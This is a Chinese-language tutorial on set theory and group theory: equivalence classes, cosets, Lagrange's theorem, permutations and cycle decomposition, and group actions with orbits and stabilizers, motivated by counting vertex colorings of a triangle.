<h2>集合论基础</h2>
<div id="关系" class="section level3">
<h3>关系</h3>
<p><strong>关系 (relation)</strong> 指集合内部分元素之间的某种关联。比如整数构成的集合内元素间可以存在倍数关系，三角形构成的集合内元素间可以存在相似关系。</p>
<p>首先回顾集合 <span class="math inline">\(A\)</span> 和 <span class="math inline">\(B\)</span> 的 <strong>笛卡尔积 (Cartesian product)</strong> 定义：</p>
<p><span class="math display">\[
A \times B = \left\{ (a, b) \mid a \in A, b \in B \right\}
\]</span></p>
<p>可见 <span class="math inline">\(A \times B\)</span> 后得到的是一个由二元组的集合，并且这些二元组的左部来自于集合 <span class="math inline">\(A\)</span>，右部来自于集合 <span class="math inline">\(B\)</span>。</p>
<p>接下来尝试相对严格地定义关系：对于集合 <span class="math inline">\(A\)</span>，集合 <span class="math inline">\(A \times A\)</span> 的每个子集 <span class="math inline">\(R\)</span> 都叫做集合 <span class="math inline">\(A\)</span> 上的一个关系。如果 <span class="math inline">\((a, b) \in R\)</span>，则称 <span class="math inline">\(a\)</span> 和 <span class="math inline">\(b\)</span> 有关系 <span class="math inline">\(R\)</span>，记作 <span class="math inline">\(aRb\)</span>。</p>
</div>
<div id="等价关系" class="section level3">
<h3>等价关系</h3>
<p>等价关系是一类特殊的关系。若集合 <span class="math inline">\(A\)</span> 上的关系 <span class="math inline">\(\sim\)</span> 满足如下条件：</p>
<ul>
<li><strong>自反性</strong>：<span class="math inline">\(\forall a \in A\)</span>，<span class="math inline">\(a \sim a\)</span>；</li>
<li><strong>对称性</strong>：<span class="math inline">\(\forall a, b \in A\)</span>，若 <span class="math inline">\(a \sim b\)</span> 则 <span class="math inline">\(b \sim a\)</span>；</li>
<li><strong>传递性</strong>：<span class="math inline">\(\forall a, b \in A\)</span>，若 <span class="math inline">\(a \sim b, \ b \sim c\)</span>，则 <span class="math inline">\(a \sim c\)</span>；</li>
</ul>
<p>则称 <span class="math inline">\(\sim\)</span> 是<strong>等价关系 (equivalence relation)</strong>。</p>
<p>前面提到的整除关系并不一定满足对称性、传递性，因此不属于等价关系；而三角形间的相似则满足全部 <span class="math inline">\(3\)</span> 条性质，因此属于等价关系。</p>
<p>再举一个例子，定义关系 <span class="math inline">\(a \sim b := a \equiv b \pmod 7\)</span>，即若 <span class="math inline">\(a\)</span> 和 <span class="math inline">\(b\)</span> 除以 <span class="math inline">\(7\)</span> 所得的余数相等则称 <span class="math inline">\(a\)</span> 和 <span class="math inline">\(b\)</span> 间存在关系 <span class="math inline">\(\sim\)</span>，也可以很容易验证自反性、对称性、传递性。</p>
</div>
<div id="等价类" class="section level3">
<h3>等价类</h3>
<p>发现等价关系可以对集合内的元素进行分类：</p>
<ul>
<li>依据三角形的相似关系可以对三角形集合进行分类，</li>
<li>依据模 <span class="math inline">\(7\)</span> 的余数可以把所有自然数分成 <span class="math inline">\(7\)</span> 类。</li>
</ul>
<p>设 <span class="math inline">\(\sim\)</span> 是 <span class="math inline">\(A\)</span> 上的等价关系，<span class="math inline">\(\forall a \in A\)</span>，<span class="math inline">\([a]\)</span> 表示 <span class="math inline">\(A\)</span> 中与 <span class="math inline">\(a\)</span> 等价的全部元素构成的集合：</p>
<p><span class="math display">\[
[a] = \{ b \sim a \mid b \in A \}
\]</span></p>
<p>称 <span class="math inline">\([a]\)</span> 为 <span class="math inline">\(a\)</span> 所在的<strong>等价类 (equivalence class)</strong>。</p>
<hr />
<p>注意到一个元素似乎只可能属于一个等价类，而不能同时存在于多个等价类内。这也就使得，不同等价类之间的交集必然为空集。</p>
<p>性质：若 <span class="math inline">\(a, b \in A\)</span> 且 <span class="math inline">\([a] \cap [b] \neq \emptyset\)</span>，则 <span class="math inline">\([a] = [b]\)</span>。</p>
<p>运用反证法可以证明这一性质：</p>
<ul>
<li>假设存在 <span class="math inline">\([a] \neq [b]\)</span> 且 <span class="math inline">\([a] \cap [b] \neq \emptyset\)</span>；</li>
<li>令 <span class="math inline">\(k_1 \in [a]\)</span> 且 <span class="math inline">\(k_1 \notin [b]\)</span>，<span class="math inline">\(k_2 \in [a] \cap [b]\)</span>；</li>
<li>则有 <span class="math inline">\(k_1 \sim a, \ k_2 \sim a, \ k_2 \sim b\)</span>；</li>
<li>由传递性得 <span class="math inline">\(k_1 \sim b\)</span>，与假设不符。</li>
</ul>
<p>这启示我们：</p>
<ul>
<li><p>集合 <span class="math inline">\(A\)</span> 可看作一些两两不相交的等价类的并：</p>
<p><span class="math display">\[
A = \bigcup\limits_{a \in R} [a] \text{（两两不相交之并）}
\]</span></p>
<p>其中，式子里的 <span class="math inline">\(R\)</span> 称之为完全代表系，由等价类 <span class="math inline">\([a_i]\)</span> 中选出一个元素构成，使得 <span class="math inline">\(A\)</span> 中每个元素都与 <span class="math inline">\(R\)</span> 中的某个元素等价，同时 <span class="math inline">\(R\)</span> 中的元素彼此不等价。</p></li>
<li><p><span class="math inline">\(A\)</span> 上的每个等价关系给出集合 <span class="math inline">\(A\)</span> 的一个<strong>划分 (partition)</strong>。</p>
<p>划分的定义：若 <span class="math inline">\(A\)</span> 是它的某些子集 <span class="math inline">\(\{ A_i | i \in I \}\)</span> 之并，且 <span class="math inline">\(A_i\)</span> 两两不交，则称其为集合 <span class="math inline">\(A\)</span> 的一个划分（或分拆）。</p></li>
</ul>
<p>引入等价类的意义就是为了对集合中的元素进行分类。后面要介绍的轨道、陪集等本质上都是基于等价关系的。</p>
</div>
</div>
<div id="群论基础-1" class="section level2">
<h2>群论基础</h2>
<div id="群" class="section level3">
<h3>群</h3>
<p>设 <span class="math inline">\(G\)</span> 是非空集合，且二元运算 <span class="math inline">\(\cdot\)</span> 满足：</p>
<ul>
<li>结合律：<span class="math inline">\((a \cdot b) \cdot c = a \cdot (b \cdot c)\)</span></li>
<li>单位元 <span class="math inline">\(e\)</span>：<span class="math inline">\(\forall a \in G, \ ea = ae = a\)</span></li>
<li>逆元：<span class="math inline">\(\forall a \in G, \ \exist b \in G \text{ \ s.t. \ } ab = ba = e\)</span></li>
</ul>
<p>则称 <span class="math inline">\((G, \cdot)\)</span> 是一个<strong>群 (group)</strong>，有时也简写成 <span class="math inline">\(G\)</span>。</p>
<p>需要注意的是，群并不要求运算满足交换律。如果运算满足交换律，称这样的群为<strong>阿贝尔群 (Abelian group)</strong>，或交换群。另外，若群 <span class="math inline">\(G\)</span> 的大小有限，则成其为<strong>有限群 (finite group)</strong>。</p>
<hr />
<p>例如在集合 <span class="math inline">\(\mathbb{Z}_7 = [0, 1, 2, 3, 4, 5, 6]\)</span> 上定义模 <span class="math inline">\(7\)</span> 加法，即 <span class="math inline">\(a + b := (a + b) \bmod 7\)</span>。我们来验证一下 <span class="math inline">\((\mathbb{Z}_7, +)\)</span> 是否成群：</p>
<ul>
<li>结合律：<span class="math inline">\((a + b) + c = a + (b + c)\)</span>；</li>
<li>单位元 <span class="math inline">\(e = 0\)</span>：<span class="math inline">\(0 + a = a + 0 = a\)</span>；</li>
<li>逆元：对于 <span class="math inline">\(a\)</span>，其逆元 <span class="math inline">\(a^{-1} = (7 - a) \bmod 7\)</span>；</li>
</ul>
<p>所以 <span class="math inline">\((\mathbb{Z}_7, +)\)</span> 成群。</p>
<hr />
<p>群有两条非常重要的性质：</p>
<ul>
<li><p>左右逆元相等：</p>
<p>设 <span class="math inline">\(x\)</span> 是 <span class="math inline">\(a\)</span> 的左逆元，<span class="math inline">\(y\)</span> 是 <span class="math inline">\(a\)</span> 的右逆元，有：</p>
<p><span class="math display">\[
x = xe = x(ay) = (xa)y = y
\]</span></p></li>
<li><p>满足消去律：</p>
<p><span class="math display">\[
\forall a, b, c \in G, \ ab = ac \Leftrightarrow b = c
\]</span></p>
<p>可见，只要逆元存在就存在消去律。</p></li>
</ul>
</div>
<div id="子群" class="section level3">
<h3>子群</h3>
<p>设 <span class="math inline">\((G, \cdot)\)</span> 为群，<span class="math inline">\(H\)</span> 是 <span class="math inline">\(G\)</span> 的子集，若 <span class="math inline">\((H, \cdot)\)</span> 成群，则称 <span class="math inline">\(H\)</span> 为 <span class="math inline">\(G\)</span> 的<strong>子群 (subgroup)</strong>，记作 <span class="math inline">\(H \le G\)</span>；</p>
</div>
<div id="陪集" class="section level3">
<h3>陪集</h3>
<p>前面提到可以通过等价类来对集合进行划分，而现在我们需要找到一种东西来对群进行划分。基于此引入陪集这一概念。</p>
<p>设 <span class="math inline">\(H \leq G\)</span>，对于 <span class="math inline">\(x \in G\)</span>：</p>
<ul>
<li><span class="math inline">\(H\)</span> 的一个<strong>左陪集 (left coset)</strong> <span class="math inline">\(xH\)</span>：
<span class="math display">\[
xH = \{ x \cdot h \mid h \in H \}
\]</span></li>
<li><span class="math inline">\(H\)</span> 的一个<strong>右陪集 (right coset)</strong> <span class="math inline">\(Hx\)</span>：
<span class="math display">\[
Hx = \{ h \cdot x \mid h \in H \}
\]</span></li>
</ul>
<p>由于左陪集和右陪集性质上相似，故后文只讨论左陪集。对于右陪集，请读者自行尝试~</p>
<hr />
<p>对于 <span class="math inline">\(x, y \in G\)</span>，定义如下关系 <span class="math inline">\(\sim\)</span>：</p>
<p><span class="math display">\[
x \sim y := x \in yH
\]</span></p>
<p>发现这其实是一个<strong>等价关系</strong>：</p>
<ul>
<li><strong>自反性</strong>：<span class="math inline">\(x \in xH\)</span>；
<ul>
<li>既然 <span class="math inline">\(H\)</span> 是群，则 <span class="math inline">\(e \in H\)</span>，故 <span class="math inline">\(x \cdot e = x \in xH\)</span></li>
</ul></li>
<li><strong>对称性</strong>：若 <span class="math inline">\(y \in xH\)</span>，则 <span class="math inline">\(x \in yH\)</span>；
<ul>
<li><span class="math inline">\(y \in xH \Rightarrow \exist h \in H \text{ \ s.t. \ } y = x \cdot h\)</span></li>
<li><span class="math inline">\(H\)</span> 中逆元存在，则 <span class="math inline">\(\exists h \in H, \ \text{ s.t. } \ x = y \cdot h^{-1}\)</span></li>
<li>由 <span class="math inline">\(h^{-1} \in H\)</span>，故 <span class="math inline">\(x \in yH\)</span></li>
</ul></li>
<li><strong>传递性</strong>：若 <span class="math inline">\(z \in yH, \ y \in xH\)</span>，则 <span class="math inline">\(z \in xH\)</span>。
<ul>
<li><span class="math inline">\(z \in yH \Rightarrow \exist h_1 \in H \text{ \ s.t. \ } y = z \cdot h_1\)</span></li>
<li><span class="math inline">\(y \in xH \Rightarrow \exist h_2 \in H \text{ \ s.t. \ } x = y \cdot h_2\)</span></li>
<li>令 <span class="math inline">\(h = h_1h_2\)</span>，则 <span class="math inline">\(x = z \cdot h\)</span> 且 <span class="math inline">\(h \in H\)</span>，故 <span class="math inline">\(z \in xH\)</span></li>
</ul></li>
</ul>
<hr />
<p>故直接将讨论等价类时得出的结论搬到此处：</p>
<ul>
<li><p>若 <span class="math inline">\(xH \cap yH \neq \emptyset\)</span>，则 <span class="math inline">\(xH = yH\)</span>；</p></li>
<li><p>利用陪集可以对群 <span class="math inline">\(G\)</span> 进行划分（陪集分解）：</p>
<p><span class="math display">\[
G = \bigcup\limits_{g \in R} gH \text{（两两不相交之并）}
\]</span></p>
<p>这里展现了对群 <span class="math inline">\(G\)</span> 的左陪集分解。与之前类似， <span class="math inline">\(R\)</span> 称作 <span class="math inline">\(G\)</span> 对 <span class="math inline">\(H\)</span> 左陪集的代表元系。<span class="math inline">\(R\)</span> 由 <span class="math inline">\(G\)</span> 中的元素构成，并且这些用元素生成的左陪集彼此互不相同，与此同时这些左陪集的并集恰好为 <span class="math inline">\(G\)</span>。</p></li>
</ul>
</div>
<div id="拉格朗日定理" class="section level3">
<h3>拉格朗日定理</h3>
<p>对于群 <span class="math inline">\(H \leq G\)</span>（两者均为有限群），<span class="math inline">\(\forall a, b \in H, g \in G\)</span>，由消去律：</p>
<p><span class="math display">\[
a \neq b \Leftrightarrow ga \neq gb
\]</span></p>
<p>这启示我们，<span class="math inline">\(\forall g \in G\)</span>，<span class="math inline">\(gH\)</span> 内的元素其实和 <span class="math inline">\(H\)</span> 内的元素是一一对应的。因为 <span class="math inline">\(H\)</span> 内不同的元素左乘 <span class="math inline">\(g\)</span> 后并不会变得相等。因此两者大小也是相等的： <span class="math inline">\(|H| = |gH|\)</span>。</p>
<p>这也意味着群 <span class="math inline">\(G\)</span> 对子群 <span class="math inline">\(H\)</span> 的所有陪集的大小都是相等的，并且都等于 <span class="math inline">\(|H|\)</span>。</p>
<p>记 <span class="math inline">\(R\)</span> 为 <span class="math inline">\(H\)</span> 的左陪集代表元系，有：</p>
<p><span class="math display">\[
\begin{aligned}
|G| &amp; = \sum\limits_{g \in R} |gH| \\
&amp; = \sum\limits_{g \in R} |H| \\
&amp; = |R| \cdot |H|
\end{aligned}
\]</span></p>
<p>若把 <span class="math inline">\(H\)</span> 的左陪集代表元系的大小 <span class="math inline">\(|R|\)</span> 称作群 <span class="math inline">\(H\)</span> 对于群 <span class="math inline">\(G\)</span> 的<strong>指数 (index)</strong> 并记作 <span class="math inline">\([G : H]\)</span>，便得到抽象代数里的<strong>拉格朗日定理 (Lagrange’s Theorem)</strong>：</p>
<p>设 <span class="math inline">\(G\)</span> 为有限群，<span class="math inline">\(H \leq G\)</span>，则：</p>
<p><span class="math display">\[
|G| = [G : H] \cdot |H|
\]</span></p>
</div>
</div>
<div id="置换置换群" class="section level2">
<h2>置换、置换群</h2>
<div id="置换" class="section level3">
<h3>置换</h3>
<p>一个集合的<strong>置换 (permutation)</strong> 即从该集合映射至自身的双射。</p>
<p>例如，对于 <span class="math inline">\([1, 2, \dots n]\)</span> 的置换 <span class="math inline">\(\sigma\)</span> 可记作：</p>
<p><span class="math display">\[
\sigma = 
\left(\begin{array}{c}
1 &amp; 2 &amp; \dots &amp; n \\
\sigma(1) &amp; \sigma(2) &amp; \dots &amp; \sigma(n)
\end{array}\right)
\]</span></p>
<p>其含义为，置换将 <span class="math inline">\(1\)</span> 变成 <span class="math inline">\(\sigma(1)\)</span>，<span class="math inline">\(2\)</span> 变成 <span class="math inline">\(\sigma(2)\)</span>…… 依此类推。</p>
<p>置换之间存在复合运算： <span class="math inline">\((f \circ g)(x) = f(g(x))\)</span>，后文中时常简写为 <span class="math inline">\(f \circ g\)</span>，市场也会称其为置换间的乘法。</p>
<hr />
<p>举一个例子：</p>
<p><span class="math display">\[
\left(\begin{array}{c} 
1 &amp; 2 &amp; 3 &amp; 4 &amp; 5 &amp; 6 \\ 
4 &amp; 5 &amp; 1 &amp; 3 &amp; 6 &amp; 2 
\end{array}\right)
\]</span></p>
<p>试着写出其对应的“映射关系链”：</p>
<p><span class="math display">\[
\begin{aligned}
1 &amp; \rightarrow 4 \rightarrow 3 \\
2 &amp; \rightarrow 5 \rightarrow 6
\end{aligned}
\]</span></p>
<p>任何一个置换都能被划分成若干不交的映射链吗？如果可以的话，这就意味着我们发现了一种能够更简单表示置换的方式 —— 以“映射链”相乘的形式表示置换（也就是马上会讲到的轮换表示法）。</p>
</div>
<div id="轮换表示法" class="section level3">
<h3>轮换表示法</h3>
<p><span class="math display">\[ 
\left(\begin{array}{c}
a_1 &amp; a_2 &amp; \dots &amp; a_n \\
a_2 &amp; a_3 &amp; \dots &amp; a_1
\end{array}\right) \xRightarrow{\text{记作}} (a_1 \enspace a_2 \enspace \dots \enspace a_n)
\]</span></p>
<p>借助轮换表示法来表示刚才的例子：</p>
<p><span class="math display">\[
\left(\begin{array}{c} 
1 &amp; 2 &amp; 3 &amp; 4 &amp; 5 &amp; 6 \\ 
4 &amp; 5 &amp; 1 &amp; 3 &amp; 6 &amp; 2 
\end{array}\right)
= (1 \enspace 4 \enspace 3) \cdot (2 \enspace 5 \enspace 6)
\]</span></p>
<p>这令人联想到对于整数的质因数分解…… 那么若不计轮换内的次序（即 <span class="math inline">\((a, b, c)\)</span> 和 <span class="math inline">\((b, c, a)\)</span> 当作相同置换）以及轮换间的次序（即 <span class="math inline">\((a, b, c) \cdot (d, e, f)\)</span> 与 <span class="math inline">\((d, e, f) \cdot (a, b, c)\)</span> 当作相同分解方案），对于任意置换的不交轮换分解是唯一的吗？</p>
<p>Hmm… 显然是唯一的。下面给出一个构造性的说明：</p>
<ul>
<li>对于恒等置换，显然分解是唯一的；</li>
<li>对于非恒等置换，<span class="math inline">\(\exist i \text{ \ s.t. \ } \sigma(i) \neq i\)</span>。
<ul>
<li><span class="math inline">\(i \rightarrow \sigma(i) \rightarrow \sigma^2(i) \rightarrow \dots\)</span></li>
<li>由抽屉原理，<span class="math inline">\(\exist t_1 &lt; t_2 \text{ \ s.t. \ } \sigma^{t_1}(i) = \sigma^{t_2}(i)\)</span></li>
<li>令 <span class="math inline">\(t\)</span> 为使得 <span class="math inline">\(\sigma^t(i) = i\)</span> 的最小正整数，则：
<span class="math display">\[
(i \enspace \sigma(i) \enspace \dots \enspace \sigma^{t - 1}(i))
\]</span>
是一个轮换。</li>
</ul></li>
<li>对于每个这样的 <span class="math inline">\(i\)</span> 都如此操作即可构造出一个唯一的不相交轮换分解式：
<ul>
<li>每个元素在分解式中恰好出现 <span class="math inline">\(1\)</span> 次；</li>
<li>每个元素所属于的轮换是固定的。</li>
</ul></li>
</ul>
</div>
<div id="置换的幂运算" class="section level3">
<h3>置换的幂运算</h3>
<p>下面讨论如何快速得到置换 <span class="math inline">\(\sigma\)</span> 的 <span class="math inline">\(t\)</span> 次幂 <span class="math inline">\(\sigma^t\)</span>，即与先后作用 <span class="math inline">\(t\)</span> 次 <span class="math inline">\(\sigma\)</span> 置换等价的置换。举几个例子：</p>
<p><span class="math display">\[
\begin{aligned}
(1 \enspace 2 \enspace 3 \enspace 4 \enspace 5 \enspace 6)^2 &amp; = (1 \enspace 3 \enspace 5) \cdot (2 \enspace 4 \enspace 6) \\
(1 \enspace 2 \enspace 3 \enspace 4 \enspace 5 \enspace 6)^3 &amp; =  (1 \enspace 4) \cdot (2 \enspace 5) \cdot (3 \enspace 6) \\
(1 \enspace 2 \enspace 3 \enspace 4 \enspace 5 \enspace 6)^4 &amp; = (1 \enspace 5 \enspace 3) \cdot (2 \enspace 6 \enspace 4)
\end{aligned}
\]</span></p>
<p>直接考虑置换的幂并不方便，但由于置换可被分解成若干不相交轮换，不妨先看简单一些的情形：求一个轮换的幂次。</p>
<p><span class="math display">\[
\sigma = (a_0 \enspace a_1 \enspace \dots \enspace a_{n - 1})
\]</span></p>
<p>首先根据轮换的定义，不难发现：</p>
<p><span class="math display">\[
\sigma^t(a_i) = a_{[(i + t) \bmod n]}
\]</span></p>
<p>接下来看看 <span class="math inline">\(\sigma^t\)</span> 中 <span class="math inline">\(a_i\)</span> 所在的轮换大小，实际上也就是 <span class="math inline">\(a_i\)</span> 所在“映射链”的长度。只需要求得最小正整数的 <span class="math inline">\(k\)</span>，使得 <span class="math inline">\(\sigma\)</span> 作用于 <span class="math inline">\(a_i\)</span> <span class="math inline">\(k\)</span> 次后能够回到 <span class="math inline">\(a_i\)</span>（也就是找到周期），就能够知道其所在的映射链的长度了。</p>
<p>令 <span class="math inline">\(k \in N^{*} \text{ \ s.t. \ } \sigma^{tk}(a_i) = a_i\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
&amp; i + tk \equiv i \pmod n \\
&amp; \Rightarrow tk \equiv 0 \pmod n
\end{aligned}
\]</span></p>
<p>最小正整数解：<span class="math inline">\(k = \frac{n}{\gcd(n, t)}\)</span></p>
<p>这意味着 <span class="math inline">\(\sigma^t\)</span> 可表示为 <span class="math inline">\(\gcd(n, t)\)</span> 个长为 <span class="math inline">\(\frac{n}{\gcd(n, t)}\)</span> 的轮换。</p>
<p>另外注意到 <span class="math inline">\(a_i\)</span> 所在轮换里第 <span class="math inline">\(j \ (0 \le j &lt; \gcd(n, t) )\)</span> 个元素为 <span class="math inline">\(a_{(i + jt) \bmod n}\)</span>。由于 <span class="math inline">\(i + jt \equiv i \pmod t\)</span> 且 <span class="math inline">\(\gcd(n, t) \mid t\)</span>，有 <span class="math inline">\(i + jt \equiv i \pmod {\gcd(n, t)}\)</span>。这意味着：</p>
<ul>
<li><span class="math inline">\(a_i\)</span> 所在轮换内元素下标模 <span class="math inline">\(\gcd(n, t)\)</span> 均为 <span class="math inline">\(i\)</span>；</li>
<li><span class="math inline">\(a_0, a_1, \dots a_{\gcd(n, t) - 1}\)</span> 一定位于不同轮换。</li>
</ul>
<p>这些性质足以快速求得任一长度为 <span class="math inline">\(n\)</span> 的置换的幂次：</p>
<ul>
<li>将置换分解为轮换：<span class="math inline">\(\mathcal{O}(n)\)</span>；</li>
<li>对轮换内的每一个元素应用上述性质以生成结果的轮换分解式：<span class="math inline">\(\mathcal{O}(n)\)</span>；</li>
<li>还原成置换：<span class="math inline">\(\mathcal{O}(n)\)</span>。</li>
</ul>
</div>
<div id="置换群" class="section level3">
<h3>置换群</h3>
<p><span class="math inline">\(n\)</span> 个元的所有置换，在复合运算 <span class="math inline">\(\circ\)</span> 下成群，称作 <span class="math inline">\(n\)</span> 元<strong>对称群 (symmetric group)</strong>，记作 <span class="math inline">\(S_n\)</span></p>
<ul>
<li><strong>结合律</strong>：<span class="math inline">\((\sigma \circ \tau) \circ \phi = \sigma \circ (\tau \circ \phi)\)</span></li>
<li><strong>单位元</strong>：恒等置换 <span class="math inline">\(\epsilon \circ x = x\)</span>；</li>
<li><strong>逆元</strong>：置换是双射，故必然存在逆置换。</li>
</ul>
</div>
</div>
<div id="群在集合上的作用" class="section level2">
<h2>群在集合上的作用</h2>
<p>群在集合上作用是一个非常重要的概念。考虑如下映射 <span class="math inline">\(\phi\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
\phi: G \times M &amp; \longrightarrow M \\
(\sigma, x) &amp; \longmapsto \sigma \circ x
\end{aligned}
\]</span></p>
<p>若 <span class="math inline">\(\forall x \in M\)</span> 同时满足：</p>
<ul>
<li><strong>单位元</strong>：<span class="math inline">\(\exist \epsilon \in G \text{ \ s.t. \ }\epsilon \circ x = x\)</span></li>
<li><strong>结合律</strong>：<span class="math inline">\(\tau \circ (\sigma \circ x) = (\tau \circ \sigma) \circ x\)</span></li>
</ul>
<p>则称群 <span class="math inline">\(G\)</span> 在集合 <span class="math inline">\(M\)</span> 上有群作用。</p>
<p>根据 Cayley 定理，每个群均同构于某个置换群。有了这个前提可能会更好理解群在集合上的作用。但是今天碍于主题，我们主要探讨置换群对于集合的作用。</p>
<hr />
<p>为了更加清晰地介绍这一概念，再来看看本文开头所举的对等边三角形顶点染色的例子。</p>
<p>考虑置换群 <span class="math inline">\(G\)</span> 和集合 <span class="math inline">\(M\)</span>：</p>
<p><span class="math display">\[
\begin{aligned}
G&amp; = \{ \text{顺时针旋转 } 0^\circ, 120^\circ, 240^\circ \} \\
M &amp; = \{ \text{不考虑同构时的染色方案} \}
\end{aligned}
\]</span></p>
<p>首先来看看不考虑同构时的所有染色方案：</p>
<div class="figure">
<img src="/pgslides/assets/ga-example-2.png" alt="" />
<p class="caption">不考虑同构时的染色方案</p>
</div>
<p>再来看看 <span class="math inline">\(\phi\)</span> 作用下得到的结果：</p>
<div class="figure">
<img src="/pgslides/assets/ga-example-3.png" class="plain" style="background:transparent" alt="" />
<p class="caption"><span class="math inline">\(\phi\)</span> 作用下得到的结果</p>
</div>
<p>可以看到，本质上 <span class="math inline">\(\phi\)</span> 作用后是并没有产生新元素的。另外，存在单位置换（旋转 <span class="math inline">\(0^\circ\)</span>）使得它与任何一个染色方案作用都不发生变化；多个旋转作用于染色方案也是满足结合律的。所以在这个例子里 <span class="math inline">\(G\)</span> 对 <span class="math inline">\(M\)</span> 有群作用。</p>
<p>另外，图中每一列其实都是一个等价类。发现实际上不同的等价类只有四种（第 <span class="math inline">\(2, 3, 4\)</span> 列是相同的，第 <span class="math inline">\(5, 6, 7\)</span> 列是相同的）。可见，在旋转群的作用下，本质不同的方案实际上只有 <span class="math inline">\(4\)</span> 种。</p>
<div class="figure">
<img src="/pgslides/assets/ga-example-6.png" alt="" />
<p class="caption">等价类</p>
</div>
<div id="轨道" class="section level3">
<h3>轨道</h3>
<p>我们把之前图中每一列都称作<strong>轨道</strong>。换言之，过 <span class="math inline">\(x\)</span> 的轨道就是将 <span class="math inline">\(G\)</span> 种每一个置换分别作用于 <span class="math inline">\(x\)</span> 得到的元素所组成的集合。由于群作用保证了不会产生新元素，因此这个集合是 <span class="math inline">\(M\)</span> 的子集。</p>
<hr />
<p>群 <span class="math inline">\(G\)</span> 作用于集合 <span class="math inline">\(M\)</span> 上，<span class="math inline">\(x \in M\)</span>，称 <span class="math inline">\(M\)</span> 的子集</p>
<p><span class="math display">\[
\text{orb}_G(x) = \{ \sigma \circ x \mid \sigma \in G \}
\]</span></p>
<p>为 <span class="math inline">\(x\)</span> 在 <span class="math inline">\(G\)</span> 作用下的<strong>轨道 (orbit)</strong>，简称过 <span class="math inline">\(x\)</span> 的轨道。</p>
<hr />
<p>在之前的例子中，我们发现每一个元素都是属于唯一轨道的。换句话说，借助轨道，我们可以对集合 <span class="math inline">\(M\)</span> 中的元素进行分类。那对于更一般的情况这也成立吗？为了验证这一点，不妨继续把之前讨论等价类的那一套理论搬过来：</p>
<p>定义如下关系 <span class="math inline">\(\sim\)</span>：</p>
<p><span class="math display">\[
x \sim y := x \in \text{orb}_G(y)
\]</span></p>
<p>只需要验证 <span class="math inline">\(\sim\)</span> 是一个<strong>等价关系</strong>即可。</p>
<ul>
<li><strong>自反性</strong>： <span class="math inline">\(x \in \text{orb}_G(x)\)</span>；
<ul>
<li>恒等置换 <span class="math inline">\(\epsilon \in G\)</span>，故 <span class="math inline">\(\epsilon \circ x = x \in \text{orb}_G(x)\)</span></li>
</ul></li>
<li><strong>对称性</strong>：若 <span class="math inline">\(y \in \text{orb}_G(x)\)</span>，则 <span class="math inline">\(x \in \text{orb}_G(y)\)</span>；
<ul>
<li><span class="math inline">\(y \in orb_G(x) \Rightarrow \exist \sigma \ \text{ s.t. } \ \sigma \circ x = y\)</span></li>
<li><span class="math inline">\(G\)</span> 中逆元存在，故 <span class="math inline">\(\exist \sigma \ \text{ s.t. } \ \sigma^{-1} \circ y = x\)</span></li>
<li>由 <span class="math inline">\(\sigma^{-1} \in G\)</span>，故 <span class="math inline">\(x \in \text{orb}_G(y)\)</span></li>
</ul></li>
<li><strong>传递性</strong>：若 <span class="math inline">\(z \in \text{orb}_G(y), \ y \in \text{orb}_G(x)\)</span>，则 <span class="math inline">\(z \in \text{orb}_G(x)\)</span>
<ul>
<li><span class="math inline">\(z \in orb_G(y) \Rightarrow \exist \sigma \ \text{ s.t. } \ \sigma \circ y = z\)</span></li>
<li><span class="math inline">\(y \in orb_G(x) \Rightarrow \exist \tau \ \text{ s.t. } \ \tau \circ x = y\)</span></li>
<li>令 <span class="math inline">\(\beta = \sigma \circ \tau\)</span>，则 <span class="math inline">\(\beta \circ x = z\)</span> 且 <span class="math inline">\(\beta \in G\)</span>，故 <span class="math inline">\(z \in \text{orb}_G(x)\)</span></li>
</ul></li>
</ul>
<p>Voilà! 这样一来，之前的那一套结论也可以搬过来了：</p>
<ul>
<li><p>若 <span class="math inline">\(\text{orb}_G(x) \cap \text{orb}_G(y) \neq \emptyset\)</span>，则 <span class="math inline">\(\text{orb}_G(x) = \text{orb}_G(y)\)</span>；</p></li>
<li><p>在 <span class="math inline">\(M\)</span> 的每一条轨道上取一个元素组成 <span class="math inline">\(M\)</span> 的一个子集 <span class="math inline">\(R\)</span>，称为 <span class="math inline">\(M\)</span> 的<strong>轨道的代表元集</strong>，则：</p>
<p><span class="math display">\[
M = \bigcup\limits_{x \in R} \text{orb}_G(x)
\]</span></p>
<p>并且此中各 <span class="math inline">\(\text{orb}_G(x)\)</span> 互不相交。</p></li>
</ul>
<hr />
<p>既然可用于分类，则更进一步：如果 <span class="math inline">\(G\)</span> 中两个不同的置换 <span class="math inline">\(\sigma, \tau\)</span> 作用于 <span class="math inline">\(x\)</span> 后的结果是相同的，可以认为 <span class="math inline">\(\sigma, \tau\)</span> 在仅考虑作用于 <span class="math inline">\(x\)</span> 时是两个等价的置换（试着验证一下这是等价关系？）。由此，<span class="math inline">\(| \text{orb}_G(x) |\)</span> 实际上等价于仅考虑作用于 <span class="math inline">\(x\)</span> 时 <span class="math inline">\(G\)</span> 中本质不同的置换种数。</p>
</div>
<div id="稳定子" class="section level3">
<h3>稳定子</h3>
<p>另外发现元素 <span class="math inline">\(x\)</span> 可能在部分置换下所得到的结果依然是 <span class="math inline">\(x\)</span>。将这些置换所组成的集合称作群 <span class="math inline">\(G\)</span> 作用下 <span class="math inline">\(x\)</span> 的稳定子。</p>
<hr />
<p>设群 <span class="math inline">\(G\)</span> 作用于集合 <span class="math inline">\(M\)</span>，对 <span class="math inline">\(x \in M\)</span>，称</p>
<p><span class="math display">\[
\text{stab}_G(x) = \{ \sigma \mid \sigma \in G, \sigma \circ x = x \}
\]</span></p>
<p>为群 <span class="math inline">\(G\)</span> 作用下 <span class="math inline">\(x\)</span> 的<strong>稳定子 (stabilizer)</strong>。</p>
<hr />
<p>发现 <span class="math inline">\(\text{stab}_G(x)\)</span> 其实是置换群 <span class="math inline">\(G\)</span> 的子群：</p>
<ul>
<li><strong>封闭性</strong>：<span class="math inline">\(\forall \sigma, \tau \in \text{stab}_G(x)\)</span>，<span class="math inline">\(\sigma \circ \tau \circ x = \sigma \circ x = x\)</span>，故 <span class="math inline">\((\sigma \circ \tau) \in \text{stab}_G(x)\)</span>；</li>
<li><strong>结合律</strong>：显然置换的复合满足结合律；</li>
<li><strong>单位元</strong>：恒等置换 <span class="math inline">\(\epsilon \circ x = x\)</span>；</li>
<li><strong>逆元</strong>：<span class="math inline">\(\forall \sigma \in \text{stab}_G(x)\)</span>，<span class="math inline">\(\sigma^{-1} \circ x = \sigma^{-1} \circ (\sigma \circ x) = \epsilon(x) = x\)</span>。</li>
</ul>
